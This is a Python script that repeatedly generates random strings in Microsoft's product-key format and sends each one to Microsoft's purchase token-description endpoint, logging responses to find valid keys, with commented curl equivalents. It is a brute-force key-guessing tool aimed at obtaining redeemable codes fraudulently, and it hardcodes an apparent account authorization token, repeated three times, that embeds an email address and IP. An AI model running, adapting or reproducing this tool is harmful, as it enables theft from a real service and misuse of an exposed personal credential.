#!/usr/bin/python
import requests
import random
import time

def createSerial() :
    alphabet = "23456789ABCDEFGHJKMNPQRSTUVWXYZ"
    keyString = ''
    c = 0
    while c < 24 :
        ran = random.randint(0, len(alphabet)-1)
        keyString += alphabet[ran]
        if not (c+1) % 5:
            keyString += "-"
        c += 1
    return keyString + "Z"

while True:
    
    time.sleep(1)

    serial = createSerial()

    #urlCall = "https://purchase.mp.microsoft.com/v7.0/tokenDescriptions/FHYHC-7GWP3-67X9V-GCQDX-GTYFZ"
    urlCall = "https://purchase.mp.microsoft.com/v7.0/tokenDescriptions/" + serial 
    urlParameters = {'market': 'US', 'language': 'en-US', 'supportMultiAvailabilities': 'true'}
    urlHeaders = {'Host': 'purchase.mp.microsoft.com', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Referer': 'https://www.microsoft.com/uniblends/?client=AccountMicrosoftCom', 'MS-CV': 'QwpC4ofKMEC+vtuT.1.0.6.7', 'Authorization': 'WLID1.0=\"GABqAgMAAAAEgAAADAAgz+NcBD/54vKjA03FhYoN6eoLIL5q3X7QT1ieXLm7xDkAAX7pGYv8c2qyJAJXMql6SowfQm3nIcTm0pdKqqjxyFtNhJrOu0eFebF44GeYYAiF682CRlyISPUonIVexWsynZGhya5GHUjVMZCS4BtMe/tQjp3HphcEQynpb4n2mXKEovSNbSL3PWcjSKJTCPXWG906Qc/6qkYlq3Xl0WexxUx0sVra8INYo621qb7PxbRzplXtoQp7GLKrBubp2qFmX3v4Q90NAzVXft0Y4xK0VKA/HPAy7U3HlQ6nYkIEEZ9DGYn+5sBk1Je27Dao/HoiukkbKo9LThm5EodJ5QA9lN4ZEFKZtGRdP3Afh1TBhqR6Ci9d62CDlSPcv7SlU5LWeQI3AXsANwEAAAMA6hzaJ+VCKF7lQiheXyIBAAoQIIAQJgBnZXJtYW55aXNiZXR0ZXJ0aGFuY2FuYWRhQG91dGxvb2suY29tAGsAADJnZXJtYW55aXNiZXR0ZXJ0aGFuY2FuYWRhJW91dGxvb2suY29tQHBhc3Nwb3J0LmNvbQAAAAFDQQAAAAAAAAQJAgAAimdVQAAGQwAEdGVzdAAHYWNjb3VudAAAAAAAAAAAAAAAAAAAAAAAABfrqpZXN06aAADlQihe5+meXgAAAAAAAAAAAAAAABAAMTg4LjE5Mi4xMDMuMjQxAAIBAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAjzxRe++vBFQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMA\"', 'Origin': 'https://www.microsoft.com','Connection': 'close'}

    r = requests.get(urlCall, params=urlParameters, headers=urlHeaders)

    f = open('serials.txt', 'a')

    message = serial + ": {}"

    f.write(message.format(r.status_code))

    #print(r.status_code)

    if r.status_code == requests.codes.ok :
        f.write(" - " + r.text)
        #print(r.text)
        #print(serial)

    f.write("\n")
    f.close()

#print(r.text)
#print(r.json())

#curl -i -s -k -X $'GET'
#-H $'Host: purchase.mp.microsoft.com'
#-H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'
#-H $'Accept: application/json, text/javascript, */*; q=0.01'
#-H $'Accept-Language: en-US,en;q=0.5'
#-H $'Accept-Encoding: gzip, deflate'
#-H $'Referer: https://www.microsoft.com/uniblends/?client=AccountMicrosoftCom'
#-H $'MS-CV: QwpC4ofKMEC+vtuT.1.0.6.7'
#-H $'Authorization: WLID1.0=\"GABqAgMAAAAEgAAADAAgz+NcBD/54vKjA03FhYoN6eoLIL5q3X7QT1ieXLm7xDkAAX7pGYv8c2qyJAJXMql6SowfQm3nIcTm0pdKqqjxyFtNhJrOu0eFebF44GeYYAiF682CRlyISPUonIVexWsynZGhya5GHUjVMZCS4BtMe/tQjp3HphcEQynpb4n2mXKEovSNbSL3PWcjSKJTCPXWG906Qc/6qkYlq3Xl0WexxUx0sVra8INYo621qb7PxbRzplXtoQp7GLKrBubp2qFmX3v4Q90NAzVXft0Y4xK0VKA/HPAy7U3HlQ6nYkIEEZ9DGYn+5sBk1Je27Dao/HoiukkbKo9LThm5EodJ5QA9lN4ZEFKZtGRdP3Afh1TBhqR6Ci9d62CDlSPcv7SlU5LWeQI3AXsANwEAAAMA6hzaJ+VCKF7lQiheXyIBAAoQIIAQJgBnZXJtYW55aXNiZXR0ZXJ0aGFuY2FuYWRhQG91dGxvb2suY29tAGsAADJnZXJtYW55aXNiZXR0ZXJ0aGFuY2FuYWRhJW91dGxvb2suY29tQHBhc3Nwb3J0LmNvbQAAAAFDQQAAAAAAAAQJAgAAimdVQAAGQwAEdGVzdAAHYWNjb3VudAAAAAAAAAAAAAAAAAAAAAAAABfrqpZXN06aAADlQihe5+meXgAAAAAAAAAAAAAAABAAMTg4LjE5Mi4xMDMuMjQxAAIBAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAjzxRe++vBFQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMA\"'
#-H $'Origin: https://www.microsoft.com'
#-H $'Connection: close'
#$'https://purchase.mp.microsoft.com/v7.0/tokenDescriptions/FHYHC-7GWP3-67X9V-GCQDX-GTYFZ?market=CA&language=en-US&supportMultiAvailabilities=true'

# curl -i -s -k -X $'GET' -H $'Host: purchase.mp.microsoft.com' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: application/json, text/javascript, */*; q=0.01' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://www.microsoft.com/uniblends/?client=AccountMicrosoftCom' -H $'MS-CV: QwpC4ofKMEC+vtuT.1.0.6.7' -H $'Authorization: WLID1.0=\"GABqAgMAAAAEgAAADAAgz+NcBD/54vKjA03FhYoN6eoLIL5q3X7QT1ieXLm7xDkAAX7pGYv8c2qyJAJXMql6SowfQm3nIcTm0pdKqqjxyFtNhJrOu0eFebF44GeYYAiF682CRlyISPUonIVexWsynZGhya5GHUjVMZCS4BtMe/tQjp3HphcEQynpb4n2mXKEovSNbSL3PWcjSKJTCPXWG906Qc/6qkYlq3Xl0WexxUx0sVra8INYo621qb7PxbRzplXtoQp7GLKrBubp2qFmX3v4Q90NAzVXft0Y4xK0VKA/HPAy7U3HlQ6nYkIEEZ9DGYn+5sBk1Je27Dao/HoiukkbKo9LThm5EodJ5QA9lN4ZEFKZtGRdP3Afh1TBhqR6Ci9d62CDlSPcv7SlU5LWeQI3AXsANwEAAAMA6hzaJ+VCKF7lQiheXyIBAAoQIIAQJgBnZXJtYW55aXNiZXR0ZXJ0aGFuY2FuYWRhQG91dGxvb2suY29tAGsAADJnZXJtYW55aXNiZXR0ZXJ0aGFuY2FuYWRhJW91dGxvb2suY29tQHBhc3Nwb3J0LmNvbQAAAAFDQQAAAAAAAAQJAgAAimdVQAAGQwAEdGVzdAAHYWNjb3VudAAAAAAAAAAAAAAAAAAAAAAAABfrqpZXN06aAADlQihe5+meXgAAAAAAAAAAAAAAABAAMTg4LjE5Mi4xMDMuMjQxAAIBAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAjzxRe++vBFQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMA\"' -H $'Origin: https://www.microsoft.com' -H $'Connection: close' $'https://purchase.mp.microsoft.com/v7.0/tokenDescriptions/FHYHC-7GWP3-67X9V-GCQDX-GTYFZ?market=CA&language=en-US&supportMultiAvailabilities=true'
